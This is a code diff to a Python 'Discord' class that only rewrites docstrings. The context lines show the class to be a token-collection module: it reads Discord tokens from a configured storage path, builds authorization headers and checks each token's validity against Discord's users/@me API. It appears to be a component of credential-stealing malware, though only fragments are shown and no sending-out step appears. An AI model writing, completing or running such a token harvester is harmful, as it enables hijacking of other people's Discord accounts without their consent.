@@ -20,7 +20,12 @@ class Discord:
     def __create_folder(self) -> None:
         """
         Creates storage for the Discord module.
-        :return: None
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
         """
         if not path.exists(self.__full_path):
             makedirs(self.__full_path)
@@ -28,9 +33,13 @@ class Discord:
     def __get_headers(self, token: str = None, content_type: str = "application/json") -> dict:
         """
         Composes the headers for the query.
-        :param token: str
-        :param content_type: str
-        :return: dict
+
+        Parameters:
+        - token [str]: Discord token.
+        - content_type [str]: Content type.
+
+        Returns:
+        - dict: Headers data.
         """
         headers = {
             "Content-Type": content_type,
@@ -45,8 +54,12 @@ class Discord:
     def __check_token(self, *args: MutableMapping[str, str]) -> None:
         """
         Checks token for validity.
-        :param args: [str, dict]
-        :return: None
+
+        Parameters:
+        - *args [tuple]: Discord token and query headers.
+
+        Returns:
+        - None.
         """
         try:
             query = urlopen(Request(method="GET", url="https://discordapp.com/api/v6/users/@me", headers=args[1]))
@@ -57,7 +70,12 @@ class Discord:
     def __get_tokens(self) -> None:
         """
         Collects all valid and invalid Discord tokens.
-        :return: None
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
         """
         if not path.exists(self.__config.TokensPath):
             return
@@ -116,7 +134,12 @@ class Discord:
     def run(self) -> None:
         """
         Launches the Discord tokens collection module.
-        :return: None
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
         """
         try:
 
